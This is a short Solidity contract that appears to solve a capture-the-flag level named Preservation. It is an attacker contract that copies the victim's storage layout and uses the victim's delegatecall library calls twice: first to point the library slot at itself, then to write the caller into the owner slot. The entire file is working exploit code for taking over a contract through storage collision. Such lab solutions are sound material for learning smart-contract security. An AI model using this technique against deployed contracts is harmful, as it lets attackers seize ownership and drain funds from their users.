// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "../16-Preservation.sol";

contract PreservationAttacker {
    // Storage layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public victim;

    constructor(address _victimAddress) {
        victim = Preservation(_victimAddress);
    }

    function setTime(uint256 _addr) external {
        owner = address(uint160(_addr));
    }

    function attack() external {
        victim.setFirstTime(uint256(uint160(address(this))));
        victim.setFirstTime(uint256(uint160(msg.sender)));
    }
}
